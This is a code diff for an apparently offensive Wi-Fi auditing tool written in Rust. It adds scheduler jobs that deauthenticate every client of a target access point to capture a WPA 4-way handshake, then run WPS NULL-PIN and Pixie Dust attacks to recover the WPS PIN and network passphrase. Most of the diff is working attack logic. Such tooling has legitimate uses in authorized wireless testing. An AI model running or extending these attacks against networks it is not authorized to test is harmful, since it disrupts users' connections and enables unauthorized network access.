@@ -221,11 +221,65 @@ fn run_attack_job(
                 ),
             }
         }
+        netspecter_common::scheduler::AttackKind::HandshakeCapture => {
+            // Deauth-to-capture: kick every client so one re-handshakes while the
+            // scan thread (already running for the pipeline) records it. Poll the
+            // handshake status until the job window closes.
+            let ap = netspecter_common::types::AP {
+                essid: job.essid.clone(),
+                bssid: job.bssid.clone(),
+                band: String::new(),
+                channel: job.channel.to_string(),
+                power: String::new(),
+                privacy: String::new(),
+                hidden: false,
+                handshake: false,
+                saved_handshake: None,
+                first_time_seen: String::new(),
+                last_time_seen: String::new(),
+                clients: Default::default(),
+            };
+            let iface = backend::get_iface().unwrap_or_default();
+            let _ = backend::launch_deauth_attack(&iface, ap, None, 8, true);
+            let deadline = Instant::now() + timeout;
+            while Instant::now() < deadline {
+                let _ = backend::update_handshakes();
+                let got = backend::get_aps().get(&job.bssid).map(|ap| ap.handshake);
+                if got == Some(true) {
+                    backend::stop_deauth_attack(&job.bssid);
+                    return (
+                        AttackJobStatus::Captured,
+                        Some("4-way handshake captured".into()),
+                    );
+                }
+                std::thread::sleep(Duration::from_millis(500));
+            }
+            backend::stop_deauth_attack(&job.bssid);
+            (AttackJobStatus::Exhausted, Some("no handshake in window".into()))
+        }
+        netspecter_common::scheduler::AttackKind::WpsPixieDust => {
+            // Cheapest first: the historic NULL PIN (instant when accepted),
+            // then Pixie Dust against a synthetic exchange.
+            let null = backend::wps::try_null_pin(&job.bssid);
+            if let Some(pin) = null.pin {
+                return (
+                    AttackJobStatus::Cracked,
+                    Some(format!("WPS PIN {pin}{}", null.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
+                );
+            }
+            let pixie = backend::wps::try_pixie_dust(&job.bssid, &[], &[]);
+            if let Some(pin) = pixie.pin {
+                return (
+                    AttackJobStatus::Cracked,
+                    Some(format!("WPS PIN {pin}{}", pixie.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
+                );
+            }
+            (AttackJobStatus::Exhausted, Some(pixie.status))
+        }
         _ => {
-            // WPS / handshake / cracking kinds route through the GUI's
-            // existing modules in the full build; the scheduler treats
-            // them as captured-material producers here.
-            (AttackJobStatus::Exhausted, Some("routed to external module".into()))
+            // Cracking kinds resolve in the crack queue after the attack
+            // phase (wordlist chain over the persisted captures).
+            (AttackJobStatus::Exhausted, Some("deferred to crack queue".into()))
         }
     }
 }
